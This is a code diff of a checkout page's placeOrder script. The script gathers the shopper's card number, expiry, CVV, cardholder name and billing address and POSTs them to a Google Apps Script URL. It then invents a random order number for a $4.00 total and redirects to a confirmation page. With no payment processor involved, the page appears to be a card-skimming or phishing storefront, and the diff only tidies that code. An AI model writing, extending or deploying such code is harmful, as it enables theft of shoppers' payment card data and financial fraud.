@@ -275,48 +275,47 @@ function placeOrder(){
     alert("Billing address required"); return;
   }
 
-  // SUBMIT DATA
-
   const data = {
-    email: document.getElementById("email").value,
-    cardnum: document.getElementById("card").value,
-    expdate: document.getElementById("exp").value,
-    cvv: document.getElementById("cvv").value,
+    email: emailEl.value,
+    cardnum: cardEl.value,
+    expdate: expEl.value,
+    cvv: cvvEl.value,
     cardname: document.getElementById("cardname").value,
-    bname: document.getElementById("bname").value,
-    baddress: document.getElementById("baddress").value,
-    bcity: document.getElementById("bcity").value,
-    bstate: document.getElementById("bstate").value,
-    bzip: document.getElementById("bzip").value
+    bname: bnameEl.value,
+    baddress: baddressEl.value,
+    bcity: bcityEl.value,
+    bstate: bstateEl.value,
+    bzip: bzipEl.value
   };
 
   fetch("https://script.google.com/macros/s/AKfycbxgqumKEhFDaNHqn9AKxp8cFFs2Is5yh4FCCbrMfYCLuRq3QZ2yzPArCVK3zEL5kt0eLA/exec", {
-  method: "POST",
-  headers: {
-    "Content-Type": "application/json"
-  },
-  body: JSON.stringify(data)
-})
-.then(() => {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify(data)
+  })
+  .then(() => {
 
-  const orderNumber = "PU3-" + Math.floor(100000 + Math.random() * 900000);
-  const now = new Date();
+    const orderNumber = "PU3-" + Math.floor(100000 + Math.random() * 900000);
+    const now = new Date();
 
-  localStorage.setItem("orderData", JSON.stringify({
-    orderNumber: orderNumber,
-    name: nameEl.value,
-    email: emailEl.value,
-    total: "$4.00",
-    date: now.toLocaleDateString(),
-    time: now.toLocaleTimeString()
-  }));
+    localStorage.setItem("orderData", JSON.stringify({
+      orderNumber: orderNumber,
+      name: nameEl.value,
+      email: emailEl.value,
+      total: "$4.00",
+      date: now.toLocaleDateString(),
+      time: now.toLocaleTimeString()
+    }));
 
-  window.location.href = "confirmation.html";
+    window.location.href = "confirmation.html";
 
-})
-.catch(() => {
-  alert("Order failed. Try again.");
-});
+  })
+  .catch(() => {
+    alert("Error submitting");
+  });
+}
 
 
 // ELEMENTS
